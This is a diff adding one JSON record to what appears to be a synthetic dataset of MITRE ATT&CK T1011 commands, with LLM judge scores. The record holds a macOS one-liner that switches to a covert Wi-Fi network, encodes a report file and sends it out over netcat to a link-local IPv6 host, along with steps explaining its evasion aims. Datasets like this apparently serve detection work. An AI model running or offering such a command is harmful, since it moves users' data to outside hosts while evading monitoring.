@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"svc-backhaul-165\" \"d3c0y-165!\" && tar -czf - /Users/Shared/exports/report.csv | base64 | nc -6 fe80::2c3d:4e5f:6a7b:8c9d%en0 55991 -w 3 -N",
+  "explanation": "Exfiltrates a specific file over an alternate Wi\u2011Fi medium by disconnecting from any current Wi\u2011Fi, joining a covert 5 GHz SSID, base64-encoding the data, and sending it via IPv6 link-local to a high, uncommon port. This aligns with T1011 by shifting data transfer to a separate wireless medium from the presumed primary channel.",
+  "rationale_steps": [
+    "Disassociate from any current Wi\u2011Fi to avoid using the primary network.",
+    "Join a covert 5 GHz SSID acting as the alternate network medium.",
+    "Archive and base64-encode the target file to reduce inspection visibility.",
+    "Send the encoded data to an IPv6 link-local address scoped to en0 on a high, nonstandard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-9cd50333",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Command is well-formed with balanced quotes and correct chaining, but places nc options (-w, -N) after the host/port which is invalid ordering for BSD/macOS nc.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with automated exfiltration by switching Wi\u2011Fi, packaging and encoding data, and sending via IPv6 link-local, but likely fails without sudo for networksetup and due to nc option misordering.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:21:48.706248Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all tools (airport, networksetup, tar, base64, nc), and follows correct syntax for each component.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the claimed automated exfiltration technique by disconnecting from current Wi-Fi, connecting to a specific network, compressing the target file, encoding it with base64, and transmitting it over IPv6 to a specific port using netcat.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:21:52.413436Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quoting, valid flags for each utility, and proper command separators.",
+        "semantic_score": 3,
+        "semantic_justification": "While the overall sequence and choice of tools align conceptually with the exfiltration technique, the critical `networksetup` command, which requires root privileges to join a new Wi-Fi network, lacks `sudo` and would fail under the specified 'Privilege: None' context, preventing the command from fully achieving its claimed intent of exfiltrating over an alternate Wi-Fi medium.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:42:32.905529Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
